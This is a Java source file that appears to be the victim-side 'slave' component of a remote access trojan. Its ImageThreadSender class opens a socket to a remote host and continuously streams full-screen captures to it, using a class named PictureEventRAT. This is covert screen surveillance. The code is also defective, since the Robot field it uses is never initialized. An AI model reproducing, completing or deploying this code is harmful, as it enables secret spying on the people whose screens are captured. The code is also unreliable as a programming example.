package slave;

import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.net.UnknownHostException;

import javax.swing.ImageIcon;

import netPack.PictureEventRAT;

public class ImageThreadSender extends Thread {
	
	private String host;
	private int port;
	private Robot r;
	private Socket s;
	private boolean run;
	private ObjectInputStream oin;
	private ObjectOutputStream oout;
	
	public ImageThreadSender(String host, int port){
		this.host = host;
		this.port = port;	
	}
	
	public void run(){
		run = true;
		
		try {
			s = new Socket(host,port);
			
			oout = new ObjectOutputStream(s.getOutputStream());
			oin = new ObjectInputStream(s.getInputStream());
			
			while(run){
				//Keep sending pictures to the server as fast as possible
				oout.writeObject(new PictureEventRAT(this.getScreen()));
			}
			
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	/**
	 * Creates a printecreen and return it in a ImageIcon
	 * @return
	 */
	private ImageIcon getScreen(){
		Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
		BufferedImage bi = r.createScreenCapture(new Rectangle(size));
		return new ImageIcon(bi);
	}
}